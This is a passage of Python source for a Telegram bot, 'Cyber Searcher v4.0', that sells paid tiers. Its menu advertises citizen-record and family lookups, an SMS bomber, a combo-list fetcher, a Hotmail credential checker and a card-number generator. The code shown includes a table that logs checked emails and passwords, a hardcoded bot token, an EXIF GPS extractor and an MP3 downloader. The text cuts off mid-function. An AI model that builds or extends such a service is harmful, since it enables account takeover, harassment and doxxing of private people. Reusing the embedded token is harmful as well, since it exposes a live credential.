# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║         CYBER SEARCHER v4.0 — FULL PRODUCTION           ║
# ║              Developer: @hackledin                       ║
# ╚══════════════════════════════════════════════════════════╝

import telebot
import requests
import os
import threading
import time
import json
import sqlite3
import re
import urllib3
import subprocess
import sys
import uuid
import queue
from pathlib import Path
from datetime import datetime
from random import choice, randint
from string import ascii_lowercase
from urllib.parse import quote
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
from yt_dlp import YoutubeDL
import yt_dlp
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional

# ── EXIF / PIL ────────────────────────────────────────────────
try:
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[UYARI] Pillow kurulu değil! Kurmak için: pip install Pillow")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
BOT_TOKEN     = "7885601619:AAFiz7kr-TCCuLK6N0gChRBerlJW71oH4og"
ADMIN_ID      = 8573809926
DB_PATH       = "cyber_searcher.db"
BOT_REGISTRY_FILE = "bot_registry.json"

PREMIUM_PRICE = 400
OSINT_PRICE = 200

FREE_CHECK_LIMIT = 3000
PREMIUM_CHECK_LIMIT = 999999
FREE_CAPTURE_LIMIT = 3
PREMIUM_CAPTURE_LIMIT = 999
FREE_KEYWORD_LIMIT = 3
PREMIUM_KEYWORD_LIMIT = 999

# ══════════════════════════════════════════════════════════════
#  DATABASE FUNCTIONS
# ══════════════════════════════════════════════════════════════

def db_init():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, 
        username TEXT DEFAULT '', 
        first_name TEXT DEFAULT '',
        join_date TEXT DEFAULT '', 
        total_checks INTEGER DEFAULT 0, 
        total_combos INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0,
        is_premium_osint INTEGER DEFAULT 0,
        premium_date TEXT DEFAULT '',
        premium_osint_date TEXT DEFAULT '',
        language TEXT DEFAULT 'tr', 
        api_pref INTEGER DEFAULT 0,
        keywords TEXT DEFAULT 'tiktok,instagram,netflix',
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT DEFAULT '',
        capture_used INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        user_id INTEGER, 
        username TEXT, 
        package TEXT,
        amount INTEGER, 
        date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS daily_usage (
        user_id INTEGER,
        date TEXT,
        checks INTEGER DEFAULT 0,
        hits INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, date)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS hotmail_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        email TEXT,
        password TEXT,
        status TEXT,
        detail TEXT,
        date TEXT
    )''')
    conn.commit()
    conn.close()

db_init()


def db_get(user_id, col):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"SELECT {col} FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        conn.close()
        return r[0] if r else None
    except:
        return None


def db_set(user_id, col, val):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(f"UPDATE users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit()
        conn.close()
    except:
        pass


def add_user(user_id, username="", first_name=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                  (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M")))
        conn.commit()
        conn.close()
    except:
        pass


def is_premium(user_id):
    try:
        return db_get(user_id, "is_premium") == 1
    except:
        return False


def is_premium_osint(user_id):
    try:
        return db_get(user_id, "is_premium_osint") == 1
    except:
        return False


def is_banned(user_id):
    try:
        return db_get(user_id, "is_banned") == 1
    except:
        return False


def get_ban_reason(user_id):
    try:
        reason = db_get(user_id, "ban_reason")
        return reason or "Belirtilmemiş"
    except:
        return "Belirtilmemiş"


def set_premium(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium=1, premium_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "HOTMAIL", PREMIUM_PRICE, now))
        conn.commit()
        conn.close()
        print(f"[PREMIUM] Hotmail Premium verildi: {user_id} - {username}")
        return True
    except Exception as e:
        print(f"[PREMIUM ERROR] set_premium: {e}")
        return False


def set_premium_osint(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium_osint=1, premium_osint_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "OSINT", OSINT_PRICE, now))
        conn.commit()
        conn.close()
        print(f"[PREMIUM] OSINT Premium verildi: {user_id} - {username}")
        return True
    except Exception as e:
        print(f"[PREMIUM ERROR] set_premium_osint: {e}")
        return False


def remove_premium(user_id):
    db_set(user_id, "is_premium", 0)
    db_set(user_id, "premium_date", "")


def remove_premium_osint(user_id):
    db_set(user_id, "is_premium_osint", 0)
    db_set(user_id, "premium_osint_date", "")


def get_user_stats(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT total_checks,total_combos,join_date,is_premium,is_premium_osint,premium_date,premium_osint_date,username,first_name,keywords,is_banned,ban_reason,capture_used FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        conn.close()
        return r
    except:
        return None


def get_user_name(user_id):
    name = db_get(user_id, "first_name")
    if name:
        return name
    username = db_get(user_id, "username")
    if username:
        return f"@{username}"
    return str(user_id)


def get_user_keywords(user_id):
    try:
        keywords = db_get(user_id, "keywords")
        if keywords:
            return [k.strip().lower() for k in keywords.split(',') if k.strip()]
        return ["tiktok", "instagram", "netflix"]
    except:
        return ["tiktok", "instagram", "netflix"]


def set_user_keywords(user_id, keywords_list):
    db_set(user_id, "keywords", ','.join(keywords_list))


def can_add_keyword(user_id):
    keywords = get_user_keywords(user_id)
    if is_premium(user_id):
        return len(keywords) < PREMIUM_KEYWORD_LIMIT
    return len(keywords) < FREE_KEYWORD_LIMIT


def get_keyword_limit_text(user_id):
    if is_premium(user_id):
        return f"♾️ Sınırsız"
    return f"{FREE_KEYWORD_LIMIT}"


def get_capture_used(user_id):
    try:
        return db_get(user_id, "capture_used") or 0
    except:
        return 0


def increment_capture_used(user_id):
    current = get_capture_used(user_id)
    db_set(user_id, "capture_used", current + 1)


def can_use_capture(user_id):
    if is_premium(user_id):
        return True
    return get_capture_used(user_id) < FREE_CAPTURE_LIMIT


def get_capture_limit_text(user_id):
    if is_premium(user_id):
        return f"♾️ Sınırsız"
    return f"{FREE_CAPTURE_LIMIT - get_capture_used(user_id)}"


def get_daily_usage(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT checks, hits FROM daily_usage WHERE user_id=? AND date=?", (user_id, today))
        r = c.fetchone()
        conn.close()
        if r:
            return {"checks": r[0], "hits": r[1]}
        return {"checks": 0, "hits": 0}
    except:
        return {"checks": 0, "hits": 0}


def update_daily_usage(user_id, checks=0, hits=0):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO daily_usage (user_id, date, checks, hits) VALUES (?, ?, ?, ?) "
                  "ON CONFLICT(user_id, date) DO UPDATE SET checks=checks+?, hits=hits+?",
                  (user_id, today, checks, hits, checks, hits))
        conn.commit()
        conn.close()
    except:
        pass


def save_hotmail_log(user_id, username, email, password, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("INSERT INTO hotmail_logs (user_id, username, email, password, status, detail, date) VALUES (?,?,?,?,?,?,?)",
                  (user_id, username, email, password, status, detail, now))
        conn.commit()
        conn.close()
    except:
        pass


def get_hotmail_logs(limit=50):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, username, email, password, status, detail, date FROM hotmail_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []


def get_bot_stats():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*),SUM(is_premium),SUM(is_premium_osint),SUM(total_combos),SUM(total_checks) FROM users WHERE is_banned=0")
        r = c.fetchone()
        conn.close()
        return r
    except:
        return (0, 0, 0, 0, 0)


def get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,is_banned FROM users")
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []


def find_user_by_username(username):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,is_banned FROM users WHERE username=?", (username,))
        r = c.fetchone()
        conn.close()
        return r
    except:
        return None


def get_premium_logs(limit=20):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,package,amount,date FROM premium_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []


def update_stats(user_id, combos):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE users SET total_checks=total_checks+1, total_combos=total_combos+? WHERE user_id=?", (combos, user_id))
        conn.commit()
        conn.close()
    except:
        pass


def ban_user(user_id, reason="Kural ihlali"):
    db_set(user_id, "is_banned", 1)
    db_set(user_id, "ban_reason", reason)


def unban_user(user_id):
    db_set(user_id, "is_banned", 0)
    db_set(user_id, "ban_reason", "")


def get_banned_users():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,ban_reason FROM users WHERE is_banned=1")
        r = c.fetchall()
        conn.close()
        return r
    except:
        return []


def api_pref(user_id):
    try:
        v = db_get(user_id, "api_pref")
        return v if v is not None else 0
    except:
        return 0


# ══════════════════════════════════════════════════════════════
#  LANGUAGE HELPERS
# ══════════════════════════════════════════════════════════════

def lang(user_id):
    l = db_get(user_id, "language")
    return l if l in ("tr", "en", "ar") else "tr"


def s(user_id, key, **kw):
    l = lang(user_id)
    txt = S.get(l, S["tr"]).get(key, key)
    return txt.format(**kw) if kw else txt


def get_help_content(uid):
    """Yardım menüsü içeriğini kullanıcıya özel oluşturur."""
    l = lang(uid)
    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"

    if l == "tr":
        return (
            "📖 **YARDIM MENÜSÜ**\n"
            f"📌 Durumunuz: {status}\n"
            "══════════════════════\n\n"
            "🔹 **SORGU SİSTEMLERİ** (🆓 ÜCRETSİZ):\n"
            "   • 🆔 TC Sorgu\n"
            "   • 🔍 TC Pro Sorgu\n"
            "   • 👤 Ad Soyad Sorgu\n"
            "   • 👨‍👩‍👧 Aile Sorgu\n"
            "   • 👨‍👩‍👧‍👦 Aile Pro Sorgu\n"
            "   • 🌳 Sülale Sorgu\n"
            "   • 📱 TC'den GSM\n"
            "   • 📞 GSM'den TC\n"
            "   • 🚗 Plaka Sorgu\n"
            "   • 🎓 E-Okul Sorgu\n"
            "   • 🏠 Tapu Sorgu\n"
            "   • 🗺️ Ada Parsel Sorgu\n\n"
            "🔹 **⭐ PREMIUM PAKETLER:**\n"
            "   • 🌟 Premium (400 Yıldız) → Sınırsız Hotmail + Capture + Keyword\n"
            "   • 🌍 OSINT Premium (200 Yıldız) → LeakSights OSINT (30+ Sorgu)\n"
            "   • /premium ile satın alabilirsin\n\n"
            "🔹 **DİĞER ARAÇLAR** (🆓 ÜCRETSİZ):\n"
            "   • 📦 Combo Çekme\n"
            "   • 🎥 Video İndirme\n"
            "   • 🎵 Müzik İndirme (MP3)\n"
            "   • 💳 CC Generator\n"
            "   • 🤖 Discord Token Kontrol\n"
            "   • ✈️ Telegram Token Kontrol\n"
            "   • 🌐 IP Bilgi\n"
            "   • 🔎 DNS Sorgu\n"
            "   • ⚽ Bahis Sorgu\n"
            "   • 💊 Eczane Sorgu\n"
            "   • 🛡️ Proxy Check\n"
            "   • 🔍 URL Scan\n"
            "   • 🐍 PHP→Python Çevirici\n"
            "   • 💣 SMS Bomber - 41+ Servis ✅\n"
            "   • 📧 Hotmail Checker - Free 3000 satır\n"
            "   • 📸 Capture Tool - Free 3 kullanım\n"
            "   • 📸 EXIF Metadata Analizi ✅\n"
            "   • 🌍 LeakSights OSINT - Premium (200⭐)\n\n"
            "🔹 **PROFİL:**\n"
            "   • 👤 Profil\n"
            "   • 📊 İstatistik\n"
            "   • 🏆 Lider Tablosu\n"
            "   • ⚙️ API Değiştir\n\n"
            "👨‍💻 coded by: @hackledin"
        )

    elif l == "en":
        return (
            "📖 **HELP MENU**\n"
            f"📌 Your Status: {status}\n"
            "══════════════════════\n\n"
            "🔹 **⭐ PREMIUM PACKAGES:**\n"
            "   • 🌟 Premium (400 Stars) → Unlimited Hotmail + Capture + Keyword\n"
            "   • 🌍 OSINT Premium (200 Stars) → LeakSights OSINT (30+ Queries)\n\n"
            "🔹 **OTHER TOOLS:**\n"
            "   • 💣 SMS Bomber - 41+ Services ✅\n"
            "   • 📧 Hotmail Checker - Free 3000 lines\n"
            "   • 📸 Capture Tool - Free 3 uses\n"
            "   • 📸 EXIF Metadata Analysis ✅\n"
            "   • 🎵 Music Downloader (MP3)\n"
            "   • 🌍 LeakSights OSINT - Premium (200⭐)\n\n"
            "👨‍💻 coded by: @hackledin"
        )

    else:  # ar
        return (
            "📖 **قائمة المساعدة**\n"
            f"📌 حالتك: {status}\n"
            "══════════════════════\n\n"
            "🔹 **⭐ باقات البريميوم:**\n"
            "   • 🌟 بريميوم (400 نجمة) → غير محدود Hotmail + Capture + Keyword\n"
            "   • 🌍 OSINT بريميوم (200 نجمة) → LeakSights OSINT (30+ استعلام)\n\n"
            "👨‍💻 coded by: @hackledin"
        )


# ══════════════════════════════════════════════════════════════
#  STRINGS
# ══════════════════════════════════════════════════════════════

S = {
    "tr": {
        "welcome": "🌟 <b>Cyber Searcher</b>\n\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n\n🔻 Aşağıdan işlem seç:",
        "free": "🆓 Ücretsiz",
        "premium": "⭐ PREMIUM",
        "select_op": "🛠 Kullanmak istediğin aracı seç:",
        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
        "searching": "🔍 <b>{domain}</b> taranıyor...",
        "no_result": "❌ {domain} için sonuç bulunamadı.",
        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
        "profile_title": "👤 <b>PROFİL</b>",
        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
        "help_title": "📖 <b>YARDIM MENÜSÜ</b>",
        "no_stats": "📊 Henüz hiç sorgu yapmadınız!",
        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n\n📌 Mevcut: <b>{cur}</b>\n\nBir API seç:",
        "api_set": "✅ API → <b>{api}</b>",
        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
        "lang_ok": "✅ Dil seçildi!",
        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n   • 📧 Sınırsız Hotmail Check\n   • 📸 Sınırsız Capture (20 Platform)\n   • 🔖 Sınırsız Keyword\n   • 🌍 Sınırsız OSINT (LeakSights)\n   • 📊 Detaylı istatistikler",
        "osint_price": "💰 OSINT Premium: 200 Yıldız",
        "already_premium": "⭐ Zaten Premium üyesiniz!",
        "prem_ok": "🎉 <b>Premium aktif!</b>",
        "buy_premium_btn": "⭐ Premium Satın Al (400⭐)",
        "buy_osint_btn": "🌍 OSINT Premium Satın Al (200⭐)",
        "back_btn": "◀️ Geri",
        "home_btn": "🏠 Ana Menü",
        "tools_btn": "🛠 Araçlar",
        "premium_req": "🔒 Premium gerekli!",
        "video_ask": "🎥 Video linkini gönder:",
        "video_wait": "⏳ İndiriliyor...",
        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
        "video_caption": "🎥 <b>{title}</b>\n📦 {size}  ⏱ {dur}s  👤 {upl}",
        "invalid_link": "❌ Geçerli bir link gir!",
        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n\n📥 Sorgu değerini gir:",
        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>\n📅 {date}",
        "tr_ask": "{prompt}\n\n📌 Sonuç TXT olarak gelir.",
        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>\n📅 {date}",
        "processing": "🔄 Sorgulanıyor...",
        "admin_only": "❌ Bu komut sadece admin içindir!",
        "no_data": "❌ Veri alınamadı.",
        "given_ok": "✅ Premium verildi: @{user}",
        "removed_ok": "✅ Premium kaldırıldı: @{user}",
        "user_nf": "❌ Kullanıcı bulunamadı!",
        "enter_val": "Değeri gir:",
        "invalid_tc": "❌ Geçersiz TC (11 haneli sayı olmalı)!",
        "invalid_gsm": "❌ Geçersiz GSM (10 haneli)!",
        "invalid_adsoyad": "❌ Ad ve Soyad gir!",
        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
        "multi_bot_running": "🟢 Çalışıyor",
        "multi_bot_stopped": "🔴 Durduruldu",
        "multi_bot_total": "📊 Toplam: {count} bot",
        "multi_bot_added": "✅ Bot başlatıldı!\n\n🔑 Token: `{token}`\n👤 Sahip: {owner}\n📌 Durum: 🟢 Çalışıyor",
        "multi_bot_removed": "✅ Bot durduruldu!\n\n🔑 Token: `{token}`",
        "multi_bot_not_found": "❌ Token `{token}` bulunamadı!",
        "multi_bot_exists": "⚠️ Bu token zaten çalışıyor!",
        "multi_bot_no_bots": "📭 Hiç bot kaydı bulunamadı.",
        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN\n\nÖrnek: /addbot 8369544888:ABC123...",
        "addbot_tool": "🤖 Bot Ekle",
        "announce_title": "📢 <b>ADMIN DUYURU</b>",
        "announce_sent": "✅ Duyuru gönderildi!",
        "announce_usage": "❌ Kullanım: /duyuru MESAJ",
        "announce_no_users": "❌ Gönderilecek kullanıcı bulunamadı.",
        "announce_failed": "❌ Duyuru gönderilirken hata oluştu.",
        "php2py": "🐍 PHP'den Python'a Çevirici\n\nBana bir PHP dosyası gönder, Python'a çevireyim.",
        "php2py_converting": "🔄 Çeviriliyor...",
        "php2py_done": "✅ Tamamlandı!",
        "php2py_error": "❌ Çeviri sırasında hata oluştu:\n{err}",
        "php2py_only": "❌ Sadece PHP dosyası gönder!",
        "php2py_no_token": "❌ API token alınamadı.",
    },
    "en": {
        "welcome": "🌟 <b>Cyber Searcher</b>\n\nWelcome, <b>{name}</b>!\n📌 Status: {status}\n\n🔻 Select an option:",
        "free": "🆓 Free",
        "premium": "⭐ PREMIUM",
        "osint_price": "💰 OSINT Premium: 200 Stars",
    },
    "ar": {
        "welcome": "🌟 <b>Cyber Searcher</b>\n\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}\n\n🔻 اختر خياراً:",
        "free": "🆓 مجاني",
        "premium": "⭐ بريميوم",
        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
    },
}


# ══════════════════════════════════════════════════════════════
#  EXIF METADATA MODÜLÜ
# ══════════════════════════════════════════════════════════════

def _exif_koordinat_cevir(deger, ref):
    try:
        d = float(deger[0])
        m = float(deger[1])
        s = float(deger[2])
        ondalik = d + (m / 60.0) + (s / 3600.0)
        if str(ref).upper() in ('S', 'W'):
            ondalik = -ondalik
        return round(ondalik, 7)
    except Exception:
        return None


def _exif_analiz(dosya_yolu: str) -> tuple:
    if not PIL_AVAILABLE:
        return None, "❌ Pillow kütüphanesi kurulu değil.\nKurmak için: <code>pip install Pillow</code>"

    try:
        img = Image.open(dosya_yolu)
        exif_ham = img._getexif()
    except Exception as e:
        return None, f"❌ Dosya okunamadı: {e}"

    if not exif_ham:
        return None, (
            "⚠️ Bu fotoğrafta EXIF verisi bulunamadı.\n\n"
            "<i>Sosyal medyadan indirilmiş fotoğraflarda (WhatsApp, Instagram, Telegram) "
            "EXIF verisi otomatik olarak silinir.</i>"
        )

    exif = {}
    gps = {}
    for tag_id, val in exif_ham.items():
        tag = TAGS.get(tag_id, tag_id)
        if tag == "GPSInfo":
            if isinstance(val, dict):
                for gps_id, gps_val in val.items():
                    gps_tag = GPSTAGS.get(gps_id, gps_id)
                    gps[gps_tag] = gps_val
        else:
            exif[tag] = val

    marka = str(exif.get("Make", "Bilinmiyor")).strip()
    model = str(exif.get("Model", "Bilinmiyor")).strip()
    yazilim = str(exif.get("Software", "—")).strip()

    tarih = (exif.get("DateTimeOriginal")
             or exif.get("DateTime")
             or exif.get("DateTimeDigitized")
             or "Bilinmiyor")

    gen = (exif.get("ExifImageWidth") or exif.get("ImageWidth") or img.width)
    yuk = (exif.get("ExifImageHeight") or exif.get("ImageLength") or img.height)

    iso = exif.get("ISOSpeedRatings", "—")
    if isinstance(iso, (list, tuple)):
        iso = iso[0] if iso else "—"

    diyafram = exif.get("FNumber", None)
    try:
        diyafram = f"f/{float(diyafram):.1f}"
    except Exception:
        diyafram = "—"

    obturator = exif.get("ExposureTime", None)
    try:
        ov = float(obturator)
        if ov > 0 and ov < 1:
            obturator = f"1/{int(round(1/ov))}s"
        else:
            obturator = f"{ov}s"
    except Exception:
        obturator = "—"

    odak = exif.get("FocalLength", None)
    try:
        odak = f"{float(odak):.0f} mm"
    except Exception:
        odak = "—"

    flas = exif.get("Flash", None)
    if flas is not None:
        try:
            flas = "✅ Ateşlendi" if int(flas) & 1 else "❌ Ateşlenmedi"
        except Exception:
            flas = "—"
    else:
        flas = "—"

    lens = exif.get("LensModel") or exif.get("LensMake") or "—"

    orientation_map = {
        1: "Normal", 2: "Ayna (Yatay)", 3: "180° Döndürülmüş",
        4: "Ayna (Dikey)", 5: "Ayna + 90° CW", 6: "90° CW",
        7: "Ayna + 90° CCW", 8: "90° CCW"
    }
    orientation = orientation_map.get(exif.get("Orientation"), "—")

    enlem = boylam = harita = None
    gps_tarih = None
    gps_altitude = None

    if gps:
        enl_r = gps.get("GPSLatitudeRef")
        enl_v = gps.get("GPSLatitude")
        boy_r = gps.get("GPSLongitudeRef")
        boy_v = gps.get("GPSLongitude")
        if enl_v and boy_v:
            enlem = _exif_koordinat_cevir(enl_v, enl_r)
            boylam = _exif_koordinat_cevir(boy_v, boy_r)
            if enlem is not None and boylam is not None:
                harita = f"https://www.google.com/maps?q={enlem},{boylam}"

        gps_date = gps.get("GPSDateStamp")
        gps_time = gps.get("GPSTimeStamp")
        if gps_date and gps_time:
            try:
                h, m, s = [int(float(x)) for x in gps_time]
                gps_tarih = f"{gps_date} {h:02d}:{m:02d}:{s:02d} UTC"
            except Exception:
                gps_tarih = str(gps_date)

        alt = gps.get("GPSAltitude")
        alt_ref = gps.get("GPSAltitudeRef", 0)
        if alt is not None:
            try:
                alt_val = float(alt)
                if int(alt_ref) == 1:
                    alt_val = -alt_val
                gps_altitude = f"{alt_val:.1f} m"
            except Exception:
                pass

    return {
        "marka": marka,
        "model": model,
        "yazilim": yazilim,
        "tarih": tarih,
        "genislik": gen,
        "yukseklik": yuk,
        "iso": iso,
        "diyafram": diyafram,
        "obturator": obturator,
        "odak": odak,
        "flas": flas,
        "lens": lens,
        "orientation": orientation,
        "enlem": enlem,
        "boylam": boylam,
        "harita": harita,
        "gps_var": bool(gps),
        "gps_tarih": gps_tarih,
        "gps_altitude": gps_altitude,
        "toplam_etiket": len(exif),
    }, None


def _exif_mesaj_olustur(d: dict) -> str:
    cihaz = f"{d['marka']} {d['model']}".strip()
    if cihaz.lower() in ("bilinmiyor bilinmiyor", "bilinmiyor", ""):
        cihaz = "Bilinmiyor"

    msg = (
        f"📸 <b>EXIF METADATA ANALİZİ</b>\n"
        f"{'━' * 28}\n\n"
        f"📱 <b>Cihaz:</b> <code>{cihaz}</code>\n"
        f"🔧 <b>Yazılım:</b> <code>{d['yazilim']}</code>\n"
        f"📅 <b>Çekim Tarihi:</b> <code>{d['tarih']}</code>\n"
    )

    if d.get("lens") and d["lens"] != "—":
        msg += f"🔭 <b>Lens:</b> <code>{d['lens']}</code>\n"

    msg += (
        f"\n<b>📐 Teknik Detaylar</b>\n"
        f"{'─' * 20}\n"
        f"🖼 <b>Boyut:</b> <code>{d['genislik']} × {d['yukseklik']} px</code>\n"
        f"🎯 <b>ISO:</b> <code>{d['iso']}</code>\n"
        f"📷 <b>Diyafram:</b> <code>{d['diyafram']}</code>\n"
        f"⏱ <b>Obtüratör:</b> <code>{d['obturator']}</code>\n"
        f"🔭 <b>Odak Uzaklığı:</b> <code>{d['odak']}</code>\n"
        f"⚡ <b>Flaş:</b> {d['flas']}\n"
        f"🔄 <b>Yönlendirme:</b> <code>{d['orientation']}</code>\n"
        f"🏷 <b>Toplam Etiket:</b> <code>{d.get('toplam_etiket', 0)}</code>\n\n"
    )

    if d["harita"]:
        msg += (
            f"<b>📍 GPS KOORDİNATLARI</b>\n"
            f"{'─' * 20}\n"
            f"🌐 <b>Enlem:</b> <code>{d['enlem']}</code>\n"
            f"🌐 <b>Boylam:</b> <code>{d['boylam']}</code>\n"
        )
        if d.get("gps_altitude"):
            msg += f"⛰ <b>Rakım:</b> <code>{d['gps_altitude']}</code>\n"
        if d.get("gps_tarih"):
            msg += f"🕐 <b>GPS Zamanı:</b> <code>{d['gps_tarih']}</code>\n"
        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps'te Gör</a>\n\n"
    else:
        msg += f"📍 <b>GPS:</b> <code>Konum verisi bulunamadı</code>\n\n"

    msg += f"{'━' * 28}\n🤖 <i>Cyber Searcher v4.0 | @hackledin</i>"
    return msg


# ══════════════════════════════════════════════════════════════
#  MÜZİK İNDİRİCİ MODÜLÜ (MP3)
# ══════════════════════════════════════════════════════════════

def _youtube_ara(sorgu: str) -> Optional[str]:
    try:
        q = quote(sorgu)
        html = requests.get(
            f"https://www.youtube.com/results?search_query={q}",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=15,
            verify=False
        ).text
        matches = re.findall(r'/watch\?v=([a-zA-Z0-9_-]{11})', html)
        if matches:
            return f"https://www.youtube.com/watch?v={matches[0]}"
        return None
    except Exception as e:
        print(f"[MUSIC SEARCH ERROR] {e}")
        return None


def _muzik_indir(sorgu: str) -> dict:
    if "youtube.com" in sorgu or "youtu.be" in sorgu:
        url = sorgu
    else:
        url = _youtube_ara(sorgu)

    if not url:
        return {"ok": False, "error": "❌ Şarkı bulunamadı, farklı bir isim dene."}

    os.makedirs("muzikler", exist_ok=True)

    ydl_opts = {
        'format': 'bestaudio/best',
        'outtmpl': 'muzikler/%(id)s.%(ext)s',
        'noplaylist': True,
        'quiet': True,
        'no_warnings': True,
        'max_filesize': 50 * 1024 * 1024,
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],
    }

    info = None
    dosya_adi = None

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            dosya_adi = ydl.prepare_filename(info)

            base, _ = os.path.splitext(dosya_adi)
            mp3_path = base + ".mp3"

            if os.path.exists(mp3_path):
                dosya_adi = mp3_path
            else:
                for ext in [".mp3", ".m4a", ".webm", ".ogg", ".opus"]:
                    if os.path.exists(base + ext):
                        dosya_adi = base + ext
                        break
    except Exception as e:
        print(f"[MUSIC DL ERROR] {e}")
        return {"ok": False, "error": f"❌ İndirme hatası: {str(e)[:100]}"}

    if not dosya_adi or not os.path.exists(dosya_adi):
        return {"ok": False, "error": "❌ İndirme başarısız oldu."}

    size = os.path.getsize(dosya_adi)
    if size > 50 * 1024 * 1024:
        try:
            os.remove(dosya_adi)
        except:
            pass
        return {"ok": False, "error": f"❌ Dosya çok büyük ({size/(1024*1024):.1f}MB). Limit: 50MB."}

    return {
        "ok": True,
        "path": dosya_adi,
        "title": info.get("title", "Bilinmeyen Şarkı"),
        "uploader": info.get("uploader", "Bilinmiyor"),
        "duration": info.get("duration") or 0,
        "thumbnail": info.get("thumbnail"),
        "url": url,
    }


def _process_music(msg, bot_instance):
    uid = msg.from_user.id

    if is_banned(uid):
        bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
        return

    parts = msg.text.split(' ', 1)
    if len(parts) < 2:
        bot_instance.reply_to(
            msg,
